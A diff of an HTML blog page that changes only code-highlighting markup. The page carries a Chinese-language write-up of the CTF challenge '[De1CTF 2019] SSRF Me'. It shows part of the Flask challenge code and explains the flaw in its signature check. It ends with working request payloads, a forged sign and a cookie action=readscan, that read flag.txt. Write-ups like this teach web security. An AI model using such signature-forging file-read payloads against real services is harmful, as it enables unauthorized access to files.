@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -246,7 +254,7 @@
             
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[De1CTF 2019]SSRF Me<br>hint：<code>flag is in ./flag.txt</code>         </p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><pre><code><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span>
 <span class="hljs-comment">#encoding=utf-8</span>
 <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
 <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
@@ -355,15 +363,15 @@ secert_key = os.urandom(<span class="hljs-number">16</span>)
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
     app.debug = <span class="hljs-literal">False</span>
-    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre></div></code></pre>
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre></code></pre>
 <p>利用点：     </p>
-<div class="hljs"><pre><code>result[&#39;data&#39;] = f.read()        </code></pre></div>
+<pre><code>result[&#39;data&#39;] = f.read()        </code></pre>
 <p>前提是action里有read和scan,还要通过检查<br>可以通过路由1获得加密后的sign<br><code>geneSign()</code>里<code>action=&quot;scan&quot;</code>所以我们要在param里加上read<br>获得sign后<br>在路由2里修改cookie传参即可        </p>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：</p>
-<div class="hljs"><pre><code>/geneSign?param=flag.txtread       </code></pre></div>
+<pre><code>/geneSign?param=flag.txtread       </code></pre>
 <p>得到sign:<code>411d8c10d1b90c5c4e39c1904652f8c0</code>       </p>
-<div class="hljs"><pre><code>/De1ta?param=flag.txt      
-cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pre></div>
+<pre><code>/De1ta?param=flag.txt      
+cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pre>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>flask代码审计<br>虽然看了看flask的基本知识，但看到一大段代码时总抓不到重点，还要多看看     </p>
 
             </div>
@@ -509,6 +517,8 @@ cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pr
 
 
 
+  
+    
   
 
 
